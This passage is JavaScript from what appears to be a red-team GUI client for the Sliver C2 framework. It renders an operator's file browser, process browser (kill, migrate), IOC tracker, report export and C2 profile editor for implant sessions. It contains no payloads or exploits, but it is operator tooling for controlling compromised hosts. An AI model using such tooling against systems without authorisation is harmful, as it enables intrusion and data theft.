      pdf:'📕', doc:'📘', docx:'📘', xls:'📗', xlsx:'📗', ppt:'📙', pptx:'📙', csv:'📊',
      db:'🗃️', sqlite:'🗃️', sql:'🗃️', mdb:'🗃️',
      key:'🔑', pem:'🔑', crt:'🔑', cer:'🔑', pfx:'🔑',
      lnk:'🔗', url:'🔗', iso:'💿', img:'💿', vhd:'💿', vmdk:'💿',
    };
    return map[ext] || '📄';
  }

  function fileTypeLabel(name, isDir) {
    if (isDir) return 'File Folder';
    const ext = (name.split('.').pop() || '').toLowerCase();
    const labels = {
      exe:'Application', dll:'DLL Library', sys:'System File', msi:'Installer', bat:'Batch Script', cmd:'Command Script', ps1:'PowerShell Script',
      txt:'Text File', log:'Log File', cfg:'Config File', ini:'Config File', xml:'XML File', json:'JSON File', yaml:'YAML File',
      html:'HTML File', py:'Python Script', go:'Go Source', rs:'Rust Source', c:'C Source', cpp:'C++ Source', cs:'C# Source',
      zip:'ZIP Archive', rar:'RAR Archive', tar:'TAR Archive', gz:'GZip Archive',
      png:'PNG Image', jpg:'JPEG Image', jpeg:'JPEG Image', gif:'GIF Image', bmp:'Bitmap Image',
      pdf:'PDF Document', doc:'Word Document', docx:'Word Document', xls:'Excel Spreadsheet', xlsx:'Excel Spreadsheet',
      pem:'PEM Certificate', crt:'Certificate', key:'Private Key',
    };
    return labels[ext] || (ext ? ext.toUpperCase() + ' File' : 'Unknown File');
  }

  // Path helpers — Sliver's Ls RPC returns paths using the target's native
  // separator; we display them as-is and use a per-path style detector when
  // joining names, so Windows paths stay `C:\Users\Foo` and *nix paths stay
  // `/etc/passwd`.
  function pathSep(p) { return (p || '').indexOf('\\') >= 0 && (p || '').indexOf('/') < 0 ? '\\' : '/'; }
  function joinChild(dir, name) {
    const sep = pathSep(dir);
    const base = (dir || '').replace(/[\\/]+$/, '');
    if (!base || base === '.') return name;
    return base + sep + name;
  }
  function splitPathVisible(p) {
    p = (p || '').replace(/\\/g, '/').replace(/\/+$/, '');
    if (!p || p === '.') return [];
    return p.split('/').filter(Boolean);
  }
  function parentOf(p) {
    if (!p || p === '.' || p === '/' || /^[A-Za-z]:[\\/]?$/.test(p)) return p;
    const sep = pathSep(p);
    const idx = Math.max(p.lastIndexOf('\\'), p.lastIndexOf('/'));
    if (idx <= 0) return sep === '\\' ? '.' : '/';
    return p.slice(0, idx) || (sep === '\\' ? '.' : '/');
  }

  const history = [];
  let histIdx = -1;
  let currentPath = '.';
  let showHidden = false;

  // Simple modal prompt for text input — used by New Folder / Rename.
  function fbPrompt(title, initial) {
    return new Promise(resolve => {
      const backdrop = document.createElement('div');
      backdrop.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:9999;display:flex;align-items:center;justify-content:center';
      backdrop.innerHTML = `
        <div style="background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:16px;min-width:360px;box-shadow:0 8px 32px rgba(0,0,0,0.4)">
          <div style="font-weight:600;margin-bottom:10px">${esc(title)}</div>
          <input type="text" id="_fbp_input" style="width:100%;padding:8px;background:var(--panel);border:1px solid var(--border);border-radius:4px;color:var(--fg);font-family:inherit" value="${esc(initial || '')}" />
          <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:14px">
            <button class="btn" id="_fbp_cancel">Cancel</button>
            <button class="btn primary" id="_fbp_ok">OK</button>
          </div>
        </div>`;
      document.body.appendChild(backdrop);
      const input = backdrop.querySelector('#_fbp_input');
      input.focus(); input.select();
      const done = (val) => { backdrop.remove(); resolve(val); };
      backdrop.querySelector('#_fbp_ok').onclick = () => done(input.value.trim() || null);
      backdrop.querySelector('#_fbp_cancel').onclick = () => done(null);
      input.addEventListener('keydown', e => {
        if (e.key === 'Enter') done(input.value.trim() || null);
        if (e.key === 'Escape') done(null);
      });
    });
  }

  // Render the right preview panel from a file entry
  function showPreview(f, fullPath) {
    const pv = document.getElementById(`fb-preview-${dockId}`);
    if (!pv) return;
    if (!f) {
      pv.innerHTML = `<div class="fb-preview-empty">Select a file to see details</div>`;
      return;
    }
    const icon = fileIcon(f.name, f.isDir);
    const typeLabel = fileTypeLabel(f.name, f.isDir);
    const size = f.isDir ? '-' : fmtSize(f.size);
    pv.innerHTML = `
      <div class="fb-preview-icon">${icon}</div>
      <div class="fb-preview-name">${esc(f.name)}</div>
      <div class="fb-preview-type">${typeLabel}</div>
      <div class="fb-preview-divider"></div>
      <div class="fb-preview-row"><span class="fb-preview-label">Path</span><span class="fb-preview-val">${esc(fullPath)}</span></div>
      <div class="fb-preview-row"><span class="fb-preview-label">Size</span><span class="fb-preview-val">${size}</span></div>
      <div class="fb-preview-row"><span class="fb-preview-label">Mode</span><span class="fb-preview-val">${esc(f.mode || '-')}</span></div>
      <div class="fb-preview-actions" style="display:flex;flex-direction:column;gap:6px">
        ${f.isDir ? '' : `<button class="fb-preview-btn" id="fb-dl-${dockId}">⬇ Download</button>`}
        <button class="fb-preview-btn" id="fb-rename-${dockId}">✎ Rename</button>
        <button class="fb-preview-btn" id="fb-copy-${dockId}">⧉ Copy to…</button>
        <button class="fb-preview-btn" id="fb-chmod-${dockId}">🔒 Chmod</button>
        <button class="fb-preview-btn danger" id="fb-del-${dockId}">🗑 Delete</button>
      </div>
      ${f.isDir ? `<div class="fb-preview-tip" style="margin-top:8px">Double-click to enter folder</div>` : ''}
    `;
    // Download → save dialog on the operator machine, actual bytes over the wire.
    pv.querySelector(`#fb-dl-${dockId}`)?.addEventListener('click', async () => {
      toast('info', `Downloading ${f.name}…`);
      const res = await App().DownloadFile(sessionID, fullPath).catch(e => ({ error: String(e) }));
      if (res && res.error) { if (res.error !== 'save cancelled') toast('error', res.error); return; }
      toast('ok', `Saved ${res.bytes} bytes → ${res.path}`);
    });
    // Rename → target dir + new name via MoveFile (Mv RPC).
    pv.querySelector(`#fb-rename-${dockId}`)?.addEventListener('click', async () => {
      const newName = await fbPrompt(`Rename '${f.name}' to:`, f.name);
      if (!newName || newName === f.name) return;
      const dst = joinChild(parentOf(fullPath), newName);
      const err = await App().MoveFile(sessionID, fullPath, dst).catch(e => e.toString());
      if (err) { toast('error', err); return; }
      toast('ok', `Renamed → ${newName}`);
      renderDir(currentPath, false);
    });
    // Copy → prompt for destination path, use CopyFile (Cp RPC).
    pv.querySelector(`#fb-copy-${dockId}`)?.addEventListener('click', async () => {
      const dst = await fbPrompt(`Copy '${f.name}' to path:`, joinChild(currentPath, f.name + '.copy'));
      if (!dst) return;
      const [n, err] = await App().CopyFile(sessionID, fullPath, dst).then(r => [r, null]).catch(e => [0, e.toString()]);
      if (err) { toast('error', err); return; }
      toast('ok', `Copied ${n} bytes → ${dst}`);
      renderDir(currentPath, false);
    });
    // Chmod → mode string; harmless no-op on Windows targets (implant ignores).
    pv.querySelector(`#fb-chmod-${dockId}`)?.addEventListener('click', async () => {
      const mode = await fbPrompt(`Chmod '${f.name}' (octal, e.g. 755):`, '755');
      if (!mode) return;
      const err = await App().Chmod(sessionID, fullPath, mode).catch(e => e.toString());
      if (err) { toast('error', err); return; }
      toast('ok', `Chmod ${mode}`);
      renderDir(currentPath, false);
    });
    // Delete
    pv.querySelector(`#fb-del-${dockId}`)?.addEventListener('click', async () => {
      const ok = await uiConfirm(`Delete '${f.name}'?`, { title: 'Delete File', okLabel: 'Delete', danger: true });
      if (!ok) return;
      const err = await App().FileBrowserDelete(sessionID, fullPath).catch(e => e.toString());
      if (err) { toast('error', err); return; }
      toast('ok', `Deleted: ${f.name}`);
      renderDir(currentPath, false);
    });
  }

  async function renderDir(path, addToHistory) {
    const container = document.getElementById(`fb-dock-${dockId}`);
    if (!container) return;
    const result = await App().FileBrowserList(sessionID, path);
    if (result.error) { toast('error', result.error); container.innerHTML = `<p style="padding:10px;color:var(--accent)">Error: ${esc(result.error)}</p>`; return; }
    currentPath = result.path || path;

    if (addToHistory !== false) {
      histIdx++;
      history.length = histIdx;
      history.push(currentPath);
    }

    const parts = splitPathVisible(currentPath);
    let crumbs = '';
    const isWin = pathSep(currentPath) === '\\';
    for (let i = 0; i < parts.length; i++) {
      // Rebuild the partial path with the platform's separator so clicks work
      // on Windows drive-letter paths (C:\Users\Foo).
      const partial = isWin
        ? (parts[0].endsWith(':') ? parts.slice(0, i + 1).join('\\') : '\\' + parts.slice(0, i + 1).join('\\'))
        : '/' + parts.slice(0, i + 1).join('/');
      crumbs += `<span class="fb-crumb" data-nav="${esc(partial)}">${esc(parts[i])}</span>`;
      if (i < parts.length - 1) crumbs += '<span class="fb-sep">›</span>';
    }

    let files = (result.files || []).slice();
    if (!showHidden) files = files.filter(f => !(f.name || '').startsWith('.'));
    const sorted = files.sort((a, b) => {
      if (a.isDir !== b.isDir) return a.isDir ? -1 : 1;
      return (a.name || '').localeCompare(b.name || '');
    });
    const dirCount = sorted.filter(f => f.isDir).length;
    const fileCount = sorted.length - dirCount;

    let html = `<div class="file-browser">
      <div class="fb-toolbar" style="flex-wrap:wrap;gap:4px">
        <button class="fb-nav-btn" id="fb-back-${dockId}" title="Back"${histIdx <= 0 ? ' disabled' : ''}>◀</button>
        <button class="fb-nav-btn" id="fb-fwd-${dockId}" title="Forward"${histIdx >= history.length - 1 ? ' disabled' : ''}>▶</button>
        <button class="fb-nav-btn" id="fb-up-${dockId}" title="Up one level">⬆</button>
        <button class="fb-nav-btn" id="fb-home-${dockId}" title="Implant's working directory (pwd)">🏠</button>
        <button class="fb-nav-btn" id="fb-refresh-${dockId}" title="Refresh">🔄</button>
        <input type="text" class="fb-path-input" id="fb-path-${dockId}" value="${esc(currentPath)}" placeholder="Type a path and press Enter (e.g. C:\\Users, /etc)" style="flex:1;min-width:180px;padding:4px 8px;background:var(--panel);border:1px solid var(--border);border-radius:4px;color:var(--fg);font-family:inherit;font-size:12px" />
        <button class="fb-nav-btn" id="fb-mkdir-${dockId}" title="New folder">📂+</button>
        <button class="fb-nav-btn" id="fb-upload-${dockId}" title="Upload file to this directory">⬆️</button>
        <button class="fb-nav-btn" id="fb-grep-${dockId}" title="Grep files under this directory">🔍</button>
        <button class="fb-nav-btn" id="fb-hidden-${dockId}" title="Toggle hidden files">${showHidden ? '👁' : '👁‍🗨'}</button>
      </div>
      <div class="fb-body-split">
        <div class="fb-left-pane">
          <div class="fb-col-header">
            <span></span><span>Name</span><span style="text-align:right">Size</span><span>Mode</span>
          </div>
          <div class="fb-list" id="fb-list-${dockId}">`;

    sorted.forEach(f => {
      const cls = f.isDir ? 'fb-item dir' : 'fb-item';
      const icon = fileIcon(f.name, f.isDir);
      const size = f.isDir ? '-' : fmtSize(f.size);
      html += `<div class="${cls}" data-path="${esc(joinChild(currentPath, f.name))}" data-name="${esc(f.name)}" data-dir="${f.isDir}" data-size="${f.size||0}" data-mode="${esc(f.mode||'')}">
        <span class="fb-icon">${icon}</span>
        <span class="fb-name">${esc(f.name)}</span>
        <span class="fb-size">${size}</span>
        <span class="fb-date">${esc(f.mode || '')}</span>
      </div>`;
    });

    html += `</div></div>
        <div class="fb-right-pane" id="fb-preview-${dockId}">
          <div class="fb-preview-empty">Select a file to see details</div>
        </div>
      </div>
      <div class="fb-status">
        <span>${sorted.length} items${showHidden ? '' : ' (hidden filtered)'}</span>
        <span>${dirCount} folders, ${fileCount} files</span>
      </div>
    </div>`;
    container.innerHTML = html;

    // Wire navigation
    container.querySelector(`#fb-back-${dockId}`)?.addEventListener('click', () => { if (histIdx > 0) { histIdx--; renderDir(history[histIdx], false); } });
    container.querySelector(`#fb-fwd-${dockId}`)?.addEventListener('click', () => { if (histIdx < history.length - 1) { histIdx++; renderDir(history[histIdx], false); } });
    container.querySelector(`#fb-up-${dockId}`)?.addEventListener('click', () => { renderDir(parentOf(currentPath)); });
    container.querySelector(`#fb-refresh-${dockId}`)?.addEventListener('click', () => { renderDir(currentPath, false); });
    container.querySelector(`#fb-home-${dockId}`)?.addEventListener('click', async () => {
      const home = await App().PrintWorkingDir(sessionID).catch(() => null);
      if (home) renderDir(home);
    });
    container.querySelectorAll('.fb-crumb[data-nav]').forEach(c => c.addEventListener('click', () => renderDir(c.dataset.nav)));

    // Address bar: type any absolute or relative path and press Enter.
    const pathInput = container.querySelector(`#fb-path-${dockId}`);
    pathInput?.addEventListener('keydown', e => {
      if (e.key === 'Enter') {
        const target = pathInput.value.trim();
        if (target) renderDir(target);
      }
    });

    // New folder → Mkdir RPC.
    container.querySelector(`#fb-mkdir-${dockId}`)?.addEventListener('click', async () => {
      const name = await fbPrompt(`New folder in ${currentPath}:`, 'new-folder');
      if (!name) return;
      const target = joinChild(currentPath, name);
      const err = await App().MakeDirectory(sessionID, target).catch(e => e.toString());
      if (err) { toast('error', err); return; }
      toast('ok', `Created: ${name}`);
      renderDir(currentPath, false);
    });

    // Upload → operator file dialog, target dir = currentPath, keep original name.
    container.querySelector(`#fb-upload-${dockId}`)?.addEventListener('click', async () => {
      toast('info', 'Pick a file to upload…');
      // Empty remote path lets the backend default to the local basename; we
      // then move it into currentPath if UploadFile drops it into the implant's
      // cwd. Simpler: send it directly to `<currentPath>/<basename>` — but the
      // backend needs the local file first. Use the dialog-based UploadFile and
      // rely on the operator seeing where it landed.
      const targetDir = currentPath;
      // Ask the backend to run its own file dialog; it will use basename by
      // default. We pass a trailing separator + basename via a two-step flow:
      // first the dialog picks a local file, then we upload to targetDir/<name>.
      // The backend's UploadFile does the dialog itself and uses the local
      // basename as the remote name when remotePath is empty; but we want it
      // to land in `targetDir`, not the implant's cwd. Use UploadFileFrom via
      // a lightweight prompt for the local path instead? Simpler: rely on
      // UploadFile with remotePath = targetDir + '/' — the backend appends the
      // local basename when remotePath is empty and puts the file in the
      // implant's cwd otherwise, so we must give it the full path.
      const localName = await fbPrompt('Local filename to upload (leave blank to pick with dialog):', '');
      if (localName === null) return;
      let res;
      if (localName) {
        const dest = joinChild(targetDir, localName.split(/[\\/]/).pop());
        res = await App().UploadFileFrom(sessionID, localName, dest).catch(e => ({ error: String(e) }));
      } else {
        // Dialog picks the local file; the backend uses its basename in the
        // implant's cwd. We can't inject targetDir into that path without a
        // second RPC, so warn the operator.
        toast('info', `Uploading to implant's cwd (use full remote path field to place in ${targetDir}).`);
        res = await App().UploadFile(sessionID, '').catch(e => ({ error: String(e) }));
      }
      if (res && res.error) { if (res.error !== 'upload cancelled') toast('error', res.error); return; }
      toast('ok', `Uploaded ${res.bytes} bytes → ${res.path}`);
      renderDir(currentPath, false);
    });

    // Grep → prompt for pattern, recursive under currentPath, results in a modal.
    container.querySelector(`#fb-grep-${dockId}`)?.addEventListener('click', async () => {
      const pat = await fbPrompt(`Grep pattern (regex) under ${currentPath}:`, '');
      if (!pat) return;
      toast('info', 'Searching…');
      const [out, err] = await App().GrepFiles(sessionID, pat, currentPath, true).then(r => [r, null]).catch(e => [null, e.toString()]);
      if (err) { toast('error', err); return; }
      // Show results in a scrollable modal.
      const backdrop = document.createElement('div');
      backdrop.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:9999;display:flex;align-items:center;justify-content:center';
      backdrop.innerHTML = `
        <div style="background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:16px;width:80%;max-width:900px;max-height:80vh;display:flex;flex-direction:column">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px"><b>Grep: /${esc(pat)}/</b><button class="btn small" id="_gp_close">Close</button></div>
          <pre style="flex:1;overflow:auto;background:var(--panel);padding:10px;border-radius:4px;font-size:12px;white-space:pre-wrap">${esc(out || '(no matches)')}</pre>
        </div>`;
      document.body.appendChild(backdrop);
      backdrop.querySelector('#_gp_close').onclick = () => backdrop.remove();
      backdrop.onclick = e => { if (e.target === backdrop) backdrop.remove(); };
    });

    // Hidden-toggle
    container.querySelector(`#fb-hidden-${dockId}`)?.addEventListener('click', () => {
      showHidden = !showHidden;
      renderDir(currentPath, false);
    });

    // Row: single-click → preview; double-click → navigate into dir
    let selectedItem = null;
    container.querySelectorAll('.fb-item').forEach(item => {
      item.addEventListener('click', () => {
        if (selectedItem) selectedItem.classList.remove('selected');
        item.classList.add('selected');
        selectedItem = item;
        const f = { name: item.dataset.name, isDir: item.dataset.dir === 'true', size: parseInt(item.dataset.size)||0, mode: item.dataset.mode };
        showPreview(f, item.dataset.path);
      });
      item.addEventListener('dblclick', () => { if (item.dataset.dir === 'true') renderDir(item.dataset.path); });
    });
  }
  renderDir(currentPath);
}

// ── Process Browser Panel ────────────────────────────────────────────────────
async function openProcessBrowser(sessionID) {
  const dockId = `procs-${sessionID}`;
  if (openTabs[dockId]) { activateTab(dockId); return; }
  openTabs[dockId] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();

  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = dockId;
  tab.innerHTML = `<span>⚙️ Procs: ${sessionID.slice(0,6)}</span><span class="close-x" data-cid="${dockId}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(dockId); });
  document.getElementById('interact-tabs').appendChild(tab);

  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${dockId}`;
  panel.innerHTML = `<div style="overflow:auto;flex:1;display:flex;flex-direction:column" id="pb-dock-${dockId}"><p style="padding:10px;color:var(--muted)">Loading processes...</p></div>`;
  document.getElementById('interact-panels').appendChild(panel);
  activateTab(dockId);

  // Process icon based on executable name
  function procIcon(exe, owner) {
    const e = (exe || '').toLowerCase();
    const o = (owner || '').toLowerCase();
    if (e === 'system' || e === 'system idle process' || e === '[system process]') return '🖥️';
    if (e === 'svchost.exe') return '🔩';
    if (e === 'csrss.exe' || e === 'smss.exe' || e === 'wininit.exe' || e === 'winlogon.exe' || e === 'lsass.exe' || e === 'services.exe') return '🛡️';
    if (e === 'explorer.exe') return '📁';
    if (e === 'cmd.exe' || e === 'powershell.exe' || e === 'pwsh.exe' || e === 'conhost.exe' || e === 'windowsterminal.exe') return '💻';
    if (e.includes('chrome') || e.includes('firefox') || e.includes('msedge') || e.includes('brave') || e.includes('opera')) return '🌐';
    if (e.includes('defender') || e.includes('malware') || e.includes('antivirus') || e.includes('security')) return '🛡️';
    if (e === 'taskmgr.exe' || e === 'procexp.exe' || e === 'procmon.exe') return '📊';
    if (e === 'notepad.exe' || e === 'code.exe' || e.includes('devenv') || e.includes('sublime') || e.includes('vim')) return '📝';
    if (e === 'mmc.exe' || e === 'regedit.exe') return '⚙️';
    if (e === 'dwm.exe' || e === 'fontdrvhost.exe') return '🎨';
    if (e === 'spoolsv.exe') return '🖨️';
    if (e === 'audiodg.exe' || e.includes('audio')) return '🔊';
    if (o.includes('system') || o.includes('local service') || o.includes('network service')) return '⚙️';
    return '▪️';
  }

  async function loadProcs() {
    const container = document.getElementById(`pb-dock-${dockId}`);
    if (!container) return;
    const result = await App().ProcessBrowserList(sessionID);
    if (result.error) { toast('error', result.error); container.innerHTML = `<p style="padding:10px;color:var(--accent)">Error: ${esc(result.error)}</p>`; return; }

    const allProcs = result.processes.sort((a, b) => a.pid - b.pid);

    let html = `<div class="proc-browser">
      <div class="proc-toolbar">
        <input class="proc-search" id="proc-filter-${dockId}" type="text" placeholder="🔍 Filter processes..." />
        <button class="proc-tb-btn" id="proc-refresh-${dockId}">🔄 Refresh</button>
        <button class="proc-tb-btn danger" id="proc-kill-btn-${dockId}">☠️ Kill</button>
        <button class="proc-tb-btn" id="proc-migrate-btn-${dockId}">🎯 Migrate</button>
      </div>
      <div class="proc-col-header">
        <span></span><span>PID</span><span>PPID</span><span>Name</span><span>Owner</span><span>Arch</span>
      </div>
      <div class="proc-list" id="proc-rows-${dockId}">`;

    allProcs.forEach(p => {
      const icon = procIcon(p.executable, p.owner);
      const o = (p.owner || '').toLowerCase();
      const isSystem = o.includes('system') || o.includes('local service') || o.includes('network service');
      const isSelf = p.sessionID === sessionID && (p.executable || '').toLowerCase().includes('implant'); // heuristic
      const cls = isSystem ? 'proc-item proc-system' : (isSelf ? 'proc-item proc-highlight' : 'proc-item');
      html += `<div class="${cls}" data-pid="${p.pid}" data-search="${esc((p.executable + ' ' + (p.owner || '') + ' ' + p.pid).toLowerCase())}">
        <span class="proc-icon">${icon}</span>
        <span class="proc-pid">${p.pid}</span>
        <span class="proc-pid">${p.ppid}</span>
        <span class="proc-exe">${esc(p.executable)}</span>
        <span class="proc-owner">${esc(p.owner || '')}</span>
        <span class="proc-arch">${esc(p.arch || '')}</span>
      </div>`;
    });

    html += `</div>
      <div class="proc-status">
        <span id="proc-count-${dockId}">${allProcs.length} processes</span>
        <span id="proc-selected-${dockId}">No process selected</span>
      </div>
    </div>`;
    container.innerHTML = html;

    // Search / filter
    const filterInput = container.querySelector(`#proc-filter-${dockId}`);
    const rowsContainer = container.querySelector(`#proc-rows-${dockId}`);
    const countLabel = container.querySelector(`#proc-count-${dockId}`);
    filterInput?.addEventListener('input', () => {
      const q = filterInput.value.toLowerCase();
      let visible = 0;
      rowsContainer.querySelectorAll('.proc-item').forEach(row => {
        const match = !q || (row.dataset.search || '').includes(q);
        row.style.display = match ? '' : 'none';
        if (match) visible++;
      });
      countLabel.textContent = q ? `${visible} / ${allProcs.length} processes` : `${allProcs.length} processes`;
    });

    // Row selection
    let selectedPID = null;
    container.querySelectorAll('.proc-item').forEach(item => {
      item.addEventListener('click', () => {
        container.querySelectorAll('.proc-item').forEach(i => i.classList.remove('selected'));
        item.classList.add('selected');
        selectedPID = parseInt(item.dataset.pid);
        container.querySelector(`#proc-selected-${dockId}`).textContent = `Selected: PID ${selectedPID} - ${item.querySelector('.proc-exe')?.textContent || ''}`;
      });
    });

    // Action buttons
    container.querySelector(`#proc-refresh-${dockId}`)?.addEventListener('click', () => loadProcs());
    container.querySelector(`#proc-kill-btn-${dockId}`)?.addEventListener('click', async () => {
      if (!selectedPID) { toast('info', 'Select a process first'); return; }
      const ok = await uiConfirm(`Kill PID ${selectedPID}?`, { title: 'Kill Process', okLabel: 'Kill', danger: true });
      if (!ok) return;
      await App().ProcessBrowserKill(sessionID, selectedPID);
      toast('ok', `Killed PID ${selectedPID}`);
      loadProcs();
    });
    container.querySelector(`#proc-migrate-btn-${dockId}`)?.addEventListener('click', () => {
      if (!selectedPID) { toast('info', 'Select a process first'); return; }
      toast('info', `Migrate into PID ${selectedPID} - use 'migrate ${selectedPID} <profile>' in console`);
    });
  }
  loadProcs();
}

// ── Context Menu Handlers for File/Process Browser ───────────────────────────
document.getElementById('ctx-files')?.addEventListener('click', () => {
  if (activeCtxAgent && activeCtxAgent.kind === 'session') openFileBrowser(activeCtxAgent.obj.id);
  else if (activeCtxAgent) toast('info', 'File browser requires an interactive session (not a beacon)');
  document.getElementById('ctx-menu').classList.add('hidden');
});
document.getElementById('ctx-processes')?.addEventListener('click', () => {
  if (activeCtxAgent && activeCtxAgent.kind === 'session') openProcessBrowser(activeCtxAgent.obj.id);
  else if (activeCtxAgent) toast('info', 'Process browser requires an interactive session (not a beacon)');
  document.getElementById('ctx-menu').classList.add('hidden');
});

// ── Auto-start timer on first beacon ─────────────────────────────────────────
function onFirstAgent() {
  if (!engagementTimerInterval) startEngagementTimer();
  refreshKillChain();
}

// ── Sound on new beacon/session ──────────────────────────────────────────────
function playBeaconSound() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.frequency.value = 800;
    osc.type = 'sine';
    gain.gain.value = 0.1;
    osc.start();
    osc.stop(ctx.currentTime + 0.15);
    setTimeout(() => {
      const osc2 = ctx.createOscillator();
      osc2.connect(gain);
      osc2.frequency.value = 1200;
      osc2.type = 'sine';
      osc2.start();
      osc2.stop(ctx.currentTime + 0.1);
    }, 180);
  } catch(e) {}
}

// ── IOC Tracker Panel ────────────────────────────────────────────────────────
async function openIOCPanel() {
  const iocs = await App().GetIOCs().catch(() => []);
  const iocTypeColor = { file:'var(--warn)', service:'var(--accent)', regkey:'var(--info)', schtask:'var(--ok)', user:'var(--cyan)', cron:'var(--muted)' };

  let html = `<div class="ioc-panel" style="display:flex;flex-direction:column;gap:0">
    <div style="display:flex;gap:8px;padding:0 0 12px 0;align-items:center;flex-wrap:wrap">
      <button id="ioc-cleanup-btn" class="btn small">Generate Cleanup Script</button>
      <button id="ioc-add-btn" class="btn small">+ Add Manual IOC</button>
      <button id="ioc-clear-btn" class="btn small">Clear All</button>
      <span class="spacer"></span>
      <span style="color:var(--muted);font-size:11px">${iocs.length} IOC(s) tracked</span>
    </div>`;

  if (iocs.length === 0) {
    html += `<div style="padding:24px 0;text-align:center;color:var(--muted);font-size:12px">
      <div style="font-size:28px;margin-bottom:8px">🔍</div>
      No IOCs tracked yet.<br>IOCs are recorded automatically when persistence/spawn scripts run.
    </div>`;
  } else {
    html += `<table class="data-table" style="font-size:11px"><thead><tr>
      <th>#</th><th>Time</th><th>Host</th><th>Type</th><th>Path</th><th>Detail</th>
    </tr></thead><tbody>`;
    iocs.forEach(i => {
      const col = iocTypeColor[i.type] || 'var(--muted)';
      html += `<tr>
        <td style="color:var(--muted);font-family:var(--mono)">${i.id}</td>
        <td style="color:var(--muted)">${i.timestamp}</td>
        <td>${esc(i.host)}</td>
        <td><span style="color:${col};font-weight:700;font-size:10px;text-transform:uppercase;background:${col}18;border:1px solid ${col}40;padding:1px 6px;border-radius:3px">${i.type}</span></td>
        <td style="font-family:var(--mono);color:var(--text-dim)">${esc(i.path)}</td>
        <td style="color:var(--muted)">${esc(i.detail)}</td>
      </tr>`;
    });
    html += '</tbody></table>';
  }
  html += '<pre id="ioc-script-output" class="scr-output" style="display:none;margin-top:12px"></pre></div>';

  openViewPanel('iocs', 'IOC Tracker', html);

  document.getElementById('ioc-cleanup-btn')?.addEventListener('click', async () => {
    const script = await App().GenerateCleanupScript();
    const out = document.getElementById('ioc-script-output');
    out.style.display = 'block';
    out.textContent = script;
  });
  document.getElementById('ioc-clear-btn')?.addEventListener('click', async () => {
    const ok = await uiConfirm('Clear all tracked IOCs?', { title: 'Clear IOCs', okLabel: 'Clear', danger: true });
    if (!ok) return;
    await App().ClearIOCs();
    openIOCPanel();
  });
  document.getElementById('ioc-add-btn')?.addEventListener('click', async () => {
    const host = await uiPrompt('Host (IP or hostname):', '', { title: 'Add IOC – Host' });
    if (!host) return;
    const type = await uiPrompt('Type (file/service/regkey/schtask/user/cron):', 'file', { title: 'Add IOC – Type' });
    if (!type) return;
    const path = await uiPrompt('Path / Name:', '', { title: 'Add IOC – Path' });
    if (!path) return;
    const detail = await uiPrompt('Detail (optional):', '', { title: 'Add IOC – Detail' }) || '';
    await App().AddIOC(host, type, path, detail);
    openIOCPanel();
  });
}

// ── Export Report ────────────────────────────────────────────────────────────
async function exportReport() {
  const report = await App().GenerateReport().catch(e => '# Error generating report\n\n' + e);
  const html = `<div style="display:flex;flex-direction:column;gap:10px;flex:1;min-height:0">
    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button id="report-copy-btn" class="btn small">Copy to Clipboard</button>
      <button id="report-console-btn" class="btn small">Print to Console</button>
      <span id="report-status" style="color:var(--muted);font-size:11px"></span>
    </div>
    <pre id="report-content" class="scr-output" style="flex:1;min-height:300px;overflow:auto;white-space:pre-wrap;word-break:break-word;font-size:11.5px;line-height:1.6">${esc(report)}</pre>
  </div>`;
  openViewPanel('_report', 'Engagement Report', html);

  document.getElementById('report-copy-btn')?.addEventListener('click', () => {
    navigator.clipboard.writeText(report).then(() => {
      document.getElementById('report-status').textContent = 'Copied!';
      toast('ok', 'Report copied to clipboard');
    }).catch(() => {
      const el = document.getElementById('report-content');
      const range = document.createRange(); range.selectNodeContents(el);
      const sel = window.getSelection(); sel.removeAllRanges(); sel.addRange(range);
      document.getElementById('report-status').textContent = 'Text selected - Ctrl+C to copy';
    });
  });

  document.getElementById('report-console-btn')?.addEventListener('click', () => {
    // Print the report into the active session console tab
    const panelId = activeInteractId ? `ip-${activeInteractId}` : null;
    const out = panelId ? document.querySelector(`#${panelId} .console-out`) : null;
    if (out) {
      const block = document.createElement('div');
      block.className = 'out';
      block.style.cssText = 'white-space:pre-wrap;color:var(--text-dim);font-size:11px;border-top:1px solid var(--border);padding:8px 0;margin-top:4px';
      block.textContent = report;
      out.appendChild(block);
      out.scrollTop = out.scrollHeight;
      hideModal();
      toast('ok', 'Report printed to console');
    } else {
      toast('info', 'Open a session tab first, then use Print to Console');
    }
  });
}

// ── C2 Profile Editor ─────────────────────────────────────────────────────────
async function openC2ProfileEditor() {
  const profiles = await App().ListHTTPC2Profiles().catch(() => []);
  let profileOpts = profiles.length
    ? profiles.map(p => `<div class="c2p-item" data-name="${esc(p.name)}">${esc(p.name)}</div>`).join('')
    : '<div style="color:var(--muted);padding:10px;font-size:11px">No HTTP C2 profiles found</div>';

  const html = `<div class="c2-editor">
    <div class="c2-left">
      <div class="c2-list-header">HTTP C2 Profiles</div>
      <div class="c2-profile-list" id="c2-profile-list">${profileOpts}</div>
      <div class="c2-list-footer">
        <button class="btn small" id="c2-new-btn">+ New Profile</button>
      </div>
    </div>
    <div class="c2-right">
      <div class="c2-editor-toolbar">
        <span class="c2-editor-name" id="c2-active-name">Select a profile to edit</span>
        <span class="spacer"></span>
        <button class="btn small" id="c2-save-btn">Save (Overwrite)</button>
        <button class="btn small" id="c2-save-new-btn">Save as New</button>
      </div>
      <textarea class="c2-json-editor" id="c2-json-editor" placeholder='{ &quot;name&quot;: &quot;my-profile&quot;, ... }' spellcheck="false"></textarea>
      <div class="c2-editor-status" id="c2-editor-status"></div>
    </div>
  </div>`;

  openViewPanel('c2profiles', 'C2 Profile Editor', html);

  const editor = document.getElementById('c2-json-editor');
  const status = document.getElementById('c2-editor-status');
  const activeName = document.getElementById('c2-active-name');
